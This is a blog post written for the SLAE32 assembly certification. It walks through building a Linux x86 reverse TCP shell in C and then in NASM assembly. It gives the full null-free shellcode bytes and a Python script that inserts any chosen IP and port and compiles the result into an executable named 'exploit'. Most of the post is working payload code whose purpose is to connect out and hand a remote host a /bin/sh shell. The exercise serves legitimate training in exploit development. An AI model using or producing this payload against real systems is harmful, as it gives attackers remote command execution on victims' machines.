---
title: SLAE32 - Assignment#2 [Reverse TCP Shell]
author: bigb0ss
date: 2020-12-13 13:26:00 +0800
categories: [SLAE32, Assignment_2_Reverse-TCP-Shell]
tags: [slae32, assembly, x86, Reverse TCP Shell]
image: /assets/img/post/slae32/slae32.png
---

<b>This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:</b>

<b>http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/</b>

<b>Student ID: SLAE-1542</b>

[SLAE32 Assignemt#2 Github](https://github.com/bigb0sss/SLAE32)


# Assignement #2 
* Create a Shell_Reverse_TCP shellcode
	- Reverse connects to configured IP and Port
	- Execs shell on successful connection
* IP and Port should be easily configurable

# What is a Reverse Shell?
Oppose to a Bind Shell, a Reverse Shell connects back to the attacker's computer upon a payload executed on the victim's system. This type of shell is more useful when the target organization has a strong Firewalls for inbound connection. The Reverse Shell can take the advantage of common outbound ports such as port 80, 443, 53 and etc. 

![image](/assets/img/post/slae32/assignment2/01.png)

# Socket Programming
Similar to the Bind TCP Shell exercise, let's create a Reverseh TCP Shell in a higher programming language. We will use `C` again:

```c++
#include <netinet/in.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <unistd.h>

int main()
{
    int sockfd;
	int port = 9001;

	// Address struct
    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port); 
    addr.sin_addr.s_addr = inet_addr("127.0.0.1");

   	// 1) Socket Syscall (sys_socket 1)
	sockfd = socket(AF_INET, SOCK_STREAM, 0);

    // 2) Connect Syscall
    connect(sockfd, (struct sockaddr *) &addr, sizeof(addr));
    
    // 3) Dup2 Syscall
    dup2(sockfd, 0);    //stdin
    dup2(sockfd, 1);    //stdout
    dup2(sockfd, 2);    //stderr

    // 4) Execve Syscall
    execve("/bin/sh", NULL, NULL);
    return 0;
}
```

Let's compile this: 

```console
gcc reverse-tcp-shell.c -o reverse-tcp-shell -w
```

The compiled reverse shell binary can successfully connect back to `127.0.0.1:9001` as expected.

![image](/assets/img/post/slae32/assignment2/02.png)


# Shellcode

For the Reverse TCP Shell, we need to following `syscalls`:

1) Socket: Initializing the Socket connection
2) Connect: Creating the Connect call to the given address
3) Dup2: Manages `stdin`, `stdout` and `stderr` for the file descriptor. This is necessary for input and output redirection.
4) Execve: Execute a command (`/bin/sh` to spawn a shell)

## Syscall + Function Calls

First, we need to collect arguemnts for `socketcall()` as well as other `syscalls`. 

> **NOTE**: socketcall() is a common kernel entry point for the socket system calls.

By querying `/usr/include/i386-linux-gnu/asm/unistd_32.h`, we can collect the following args for the `syscalls`:

```console
#define __NR_socketcall	102 --> Hex: 0x66
#define __NR_connect 362    --> Hex: 0x16a
#define __NR_dup2	63  --> Hex: 0x3f
#define __NR_execve	11  --> Hex: 0xb
```

Additionally, by looking at `/usr/include/linux/net.h`, we can also obtain args for the function calls:

```console
root@kali:~/Documents/SLAE32/Exam/Assignement1# cat /usr/include/linux/net.h | grep SYS
#define SYS_SOCKET	1		/* sys_socket(2)	*/
#define SYS_BIND	2		/* sys_bind(2)		*/
#define SYS_CONNECT	3		/* sys_connect(2)	*/
#define SYS_LISTEN	4		/* sys_listen(2)	*/
#define SYS_ACCEPT	5		/* sys_accept(2)	*/
#define SYS_GETSOCKNAME	6		/* sys_getsockname(2)	*/
#define SYS_GETPEERNAME	7		/* sys_getpeername(2)	*/
#define SYS_SOCKETPAIR	8		/* sys_socketpair(2)	*/
#define SYS_SEND	9		/* sys_send(2)		*/
#define SYS_RECV	10		/* sys_recv(2)		*/
#define SYS_SENDTO	11		/* sys_sendto(2)	*/
#define SYS_RECVFROM	12		/* sys_recvfrom(2)	*/
#define SYS_SHUTDOWN	13		/* sys_shutdown(2)	*/
#define SYS_SETSOCKOPT	14		/* sys_setsockopt(2)	*/
#define SYS_GETSOCKOPT	15		/* sys_getsockopt(2)	*/
#define SYS_SENDMSG	16		/* sys_sendmsg(2)	*/
#define SYS_RECVMSG	17		/* sys_recvmsg(2)	*/
#define SYS_ACCEPT4	18		/* sys_accept4(2)	*/
#define SYS_RECVMMSG	19		/* sys_recvmmsg(2)	*/
#define SYS_SENDMMSG	20		/* sys_sendmmsg(2)	*/
```

## Initialization

First, let's zero out some of the registers we are going to use:

```s
global _start

section		.text

_start:

xor eax, eax
xor ebx, ebx
xor ecx, ecx
xor edx, edx
```

## 1) Socket()

Let's create the `socket()` shellcode:

```s
; 1) Socket Creation

mov al, 0x66		; #define __NR_socketcall 102	--> Hex: 0x66
mov bl, 0x1		; #define SYS_SOCKET 1
push edx		; int protocol = 0
push ebx		; int SOCK_STREAM = 1
push 0x2		; int AF_INET = 2
mov ecx, esp		; Move stack pointer to ECX
int 0x80		; Execute SYS_SOCKET
mov edi, eax		; Save the sockfd to EDI
```

### Address struct

Let's create the address `struct` shellcode:

```s
push edx		; NULL Padding
push edx		; NULL Padding

xor eax, eax        ; Zero out EAX
; The return address 127.0.0.1 contains null-bytes which would break our shellcode. 
; We can circumvent this by subtracting 1.1.1.1 from 128.1.1.2.

mov eax, 0x02010180     ; 2.1.1.128 (*Little-Endian)
sub eax, 0x01010101     ; Subtract 1.1.1.1 
push eax        ; sin_addr = 127.0.0.1
push word 0xb315		; port = 5555 (*Little-Endian)
push word 0x2 		; int AF_INET = 2
mov esi, esp	; Move stack pointer to ESI
```


## 2) Connect()

Let's create the address `connect()` shellcode:

```s
; 2) Connect

xor eax, eax        ; Zero out EAX
xor ebx, ebx        ; Zero out EBX
mov al, 0x66		; socketcall = 102
mov bl, 0x3		; #define SYS_CONNECT	3
push 0x10		; sizeof(addr) = 10
push esi		; ESI = Server Address stuct
push edi		; EDI = sockfd
mov ecx, esp		; Move stack pointer to ECX
int 0x80		; Execute SYS_BIND
```


## 3) Dup2()

Let's create the `dup2()` shellcode:

```s
; 3) Dup2 - Input and Output Redriection

xor ecx, ecx		; Zero out
mov cl, 0x3		; Set the counter 

loop:
xor eax, eax		; Zero out
mov al, 0x3f		; #define __NR_dup2	63  --> Hex: 0x3f
mov ebx, edi		; New sockfd
dec cl		; Decrementing the counter by 1
int 0x80		

jnz loop		; Jump back to the beginning of the loop until CL is set to zero flag
```


## Execve()

Let's create the `execve()` shellcode:

```s
; 4) Execve

push edx		; NULL
push 0x68732f6e		; "hs/n"  <-- //bin/sh
push 0x69622f2f		; "ib//"
mov ebx, esp		; Move stack pointer to EBX
push edx		; NULL terminator
push ebx
mov ecx, esp		; Move stack pointer to ECX
mov al, 0xb		; #define __NR_execve	11  --> Hex: 0xb
int 0x80		; Execute SYS_EXECVE
```


## Final Shellcode (reverse-tcp-shell.nasm)

Let's put everything togeter and test the shellcode.

```s
global _start

section		.text

_start:

xor eax, eax
xor ebx, ebx
xor ecx, ecx
xor edx, edx

; 1) Socket Creation
mov al, 0x66		; #define __NR_socketcall 102	--> Hex: 0x66
mov bl, 0x1		; #define SYS_SOCKET 1
push edx		; int protocol = 0
push ebx		; int SOCK_STREAM = 1
push 0x2		; int AF_INET = 2
mov ecx, esp		; Move stack pointer to ECX
int 0x80		; Execute SYS_SOCKET
mov edi, eax		; Save the sockfd to EDI

; Address struct
push edx		; NULL Padding
push edx		; NULL Padding
xor eax, eax        ; Zero out EAX
; The return address 127.0.0.1 contains null-bytes which would break our shellcode. 
; We can circumvent this by subtracting 1.1.1.1 from 128.1.1.2.
mov eax, 0x02010180     ; 2.1.1.128 (*Little-Endian)
sub eax, 0x01010101     ; Subtract 1.1.1.1 
push eax        ; sin_addr = 127.0.0.1
push word 0xb315		; port = 5555 (*Little-Endian)
push word 0x2 		; int AF_INET = 2
mov esi, esp	; Move stack pointer to ESI

; 2) Connect
xor eax, eax        ; Zero out EAX
xor ebx, ebx        ; Zero out EBX
mov al, 0x66		; socketcall = 102
mov bl, 0x3		; #define SYS_CONNECT	3
push 0x10		; sizeof(addr) = 10
push esi		; ESI = Server Address stuct
push edi		; EDI = sockfd
mov ecx, esp		; Move stack pointer to ECX
int 0x80		; Execute SYS_BIND

; 3) Dup2 - Input and Output Redriection
xor ecx, ecx		; Zero out
mov cl, 0x3		; Set the counter 

loop:
xor eax, eax		; Zero out
mov al, 0x3f		; #define __NR_dup2	63  --> Hex: 0x3f
mov ebx, edi		; New sockfd
dec cl		; Decrementing the counter by 1
int 0x80		

jnz loop		; Jump back to the beginning of the loop until CL is set to zero flag

; 4) Execve
push edx		; NULL
push 0x68732f6e		; "hs/n"  <-- //bin/sh
push 0x69622f2f		; "ib//"
mov ebx, esp		; Move stack pointer to EBX
push edx		; NULL terminator
push ebx
mov ecx, esp		; Move stack pointer to ECX
mov al, 0xb		; #define __NR_execve	11  --> Hex: 0xb
int 0x80		; Execute SYS_EXECVE
```


# Compile

I created a simple compiler [compilerX86.py](https://github.com/bigb0sss/ASM_Learning/blob/master/compilerX86.py). Using this we can:
* Compile `reverse-tcp-shell.nasm` to a binary
* Extract shellcode from the binary to create `shellcode.c`
* Compile `shellcode.c` to a binary using `gcc`

```console
root@kali:~/Documents/SLAE32/Exam/Assignement2# python compilerX86.py -f reverse-tcp-shell
 
  ________  ________  _____ ______   ________  ___  ___       _______   ________     ___    ___ ________  ________         
 |\   ____\|\   __  \|\   _ \  _   \|\   __  \|\  \|\  \     |\  ___ \ |\   __  \   |\  \  /  /|\   __  \|\   ____\        
 \ \  \___|\ \  \|\  \ \  \\\__\ \  \ \  \|\  \ \  \ \  \    \ \   __/|\ \  \|\  \  \ \  \/  / | \  \|\  \ \  \___|      
  \ \  \    \ \  \\\  \ \  \\|__| \  \ \   ____\ \  \ \  \    \ \  \_|/_\ \   _  _\  \ \    / / \ \   __  \ \  \____   
   \ \  \____\ \  \\\  \ \  \    \ \  \ \  \___|\ \  \ \  \____\ \  \_|\ \ \  \\  \|  /     \/   \ \  \|\  \ \  ___  \ 
    \ \_______\ \_______\ \__\    \ \__\ \__\    \ \__\ \_______\ \_______\ \__\\ _\ /  /\   \    \ \_______\ \_______\ 
     \|_______|\|_______|\|__|     \|__|\|__|     \|__|\|_______|\|_______|\|__|\|__/__/ /\ __\    \|_______|\|_______|    
                                                                                    |__|/ \|__|     [bigb0ss] v1.0         

[+] Assemble: reverse-tcp-shell.nasm
[+] Linking: reverse-tcp-shell.o
[+] Shellcode: "\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x66\xb3\x01\x52\x53\x6a\x02\x89\xe1\xcd\x80\x89\xc7\x52\x52\x31\xc0\xb8\x80\x01\x01\x02\x2d\x01\x01\x01\x01\x50\x66\x68\x15\xb3\x66\x6a\x02\x89\xe6\x31\xc0\x31\xdb\xb0\x66\xb3\x03\x6a\x10\x56\x57\x89\xe1\xcd\x80\x31\xc9\xb1\x03\x31\xc0\xb0\x3f\x89\xfb\xfe\xc9\xcd\x80\x75\xf4\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x52\x53\x89\xe1\xb0\x0b\xcd\x80"
[+] Creating File: shellcode.c
[+] Compiling Executable: shellcode
[+] Enjoy!
```

![image](/assets/img/post/slae32/assignment2/03.png)


# Final Touch

Lastly, I created the following python script to change the IP address and the port number as the user input and automatically create and compile the `C` binary. 

```python
# Author: bigb0ss
# Student ID: SLAE-1542

import sys
import argparse
import subprocess
import string
import socket

""" Arguments """
parser = argparse.ArgumentParser(description = '[+] Reverse TCP Shell Generator')
parser.add_argument('-p', '--port', help='\tPort')
parser.add_argument('-ip', '--ipAddr', help='\tIP Address')
args = parser.parse_args()


def error():
    parser.print_help()
    exit(1)

def exploit(ip, port):
    
    # Reverse TCP Shell 
    shellcode1 = "\\x31\\xc0\\x31\\xdb\\x31\\xc9\\x31\\xd2"
    shellcode1+= "\\xb0\\x66\\xb3\\x01\\x52\\x53\\x6a\\x02"
    shellcode1+= "\\x89\\xe1\\xcd\\x80\\x89\\xc7\\x52\\x52"
    shellcode1+= "\\x31\\xc0\\xb8"

    # "\x80\x01\x01\x02" = IP 127.0.0.1 + 1.1.1.1

    print "[INFO] Reverse Shell IP: " + ip
    ip = ip.split(".")
    ip[:]=[int(i)+1 for i in ip]    # Adding 1 to each element in the ip array
   
    # First Octet of the IP Address
    octet1 = hex(ip[0])
    octet1 = octet1[2:]
    if len(octet1) == 2:
        octet1 = "\\x" + octet1
    else:
        octet1 = "\\x" + "%02x" % int(octet1)
    
    # Second Octet of the IP Address
    octet2 = hex(ip[1])
    octet2 = octet2[2:]
    if len(octet2) == 2:
        octet2 = "\\x" + octet2
    else:
        octet2 = "\\x" + "%02x" % int(octet2)

    # Thrid Octet of the IP Address
    octet3 = hex(ip[2])
    octet3 = octet3[2:]
    if len(octet3) == 2:
        octet3 = "\\x" + octet3
    else:
        octet3 = "\\x" + "%02x" % int(octet3)

    # Forth Octet of the IP Address
    octet4 = hex(ip[3])
    octet4 = octet4[2:]
    if len(octet4) == 2:
        octet4 = "\\x" + octet4
    else:
        octet4 = "\\x" + "%02x" % int(octet4)

    ipHex = octet1 + octet2 + octet3 + octet4

    shellcode2 = "\\x2d\\x01\\x01\\x01\\x01\\x50\\x66\\x68"  # Subtracting 1.1.1.1 = Potential Nullbyte avoidance mechanism

    # "\x15\xb3" = port 5555

    print "[INFO] Reverse Shell Port: " + port

    port = hex(socket.htons(int(port)))
    a = port[2:4]
    b = port[4:]
    if b == '':
        b = '0'
    port = '\\x{0}\\x{1}'.format(b, a)

    shellcode3 = "\\x66\\x6a\\x02\\x89\\xe6\\x31\\xc0\\x31"
    shellcode3+= "\\xdb\\xb0\\x66\\xb3\\x03\\x6a\\x10\\x56"
    shellcode3+= "\\x57\\x89\\xe1\\xcd\\x80\\x31\\xc9\\xb1"
    shellcode3+= "\\x03\\x31\\xc0\\xb0\\x3f\\x89\\xfb\\xfe"
    shellcode3+= "\\xc9\\xcd\\x80\\x75\\xf4\\x52\\x68\\x6e"
    shellcode3+= "\\x2f\\x73\\x68\\x68\\x2f\\x2f\\x62\\x69"
    shellcode3+= "\\x89\\xe3\\x52\\x53\\x89\\xe1\\xb0\\x0b"
    shellcode3+= "\\xcd\\x80"

    payload = shellcode1 + ipHex + shellcode2 + port + shellcode3

    # Adding shellcode to shellcode.c
    outShellcode = ''
    outShellcode+= '#include<stdio.h>\n'
    outShellcode+= '#include<string.h>\n'
    outShellcode+= '\n'
    outShellcode+= 'unsigned char code[] = \ \n'
    outShellcode+= '"{0}";'.format(payload)
    outShellcode+= '\n'
    outShellcode+= 'main()\n'
    outShellcode+= '{\n'
    outShellcode+= 'printf("Shellcode Length:  %d", strlen(code));\n'
    outShellcode+= '\tint (*ret)() = (int(*)())code;\n'
    outShellcode+= '\tret();\n'
    outShellcode+= '}\n'
    #print outShellcode

    # Creating shellcode.c
    filename = "exploit.c"
    outfile = open(filename, 'w')
    outfile.write(outShellcode)
    outfile.close()
    

    print "[INFO] Creating File: exploit.c"

    # Compiling shellcode.c
    subprocess.call(["gcc", "-fno-stack-protector", "-z", "execstack", filename, "-o", "exploit", "-w"])
    print "[INFO] Compiled Executable: exploit"

if __name__ == "__main__":
    inputIP = args.ipAddr if args.ipAddr != None else error()
    inputPort = args.port if args.port != None else error()
    

    exploit(inputIP, inputPort)
```

![image](/assets/img/post/slae32/assignment2/04.png)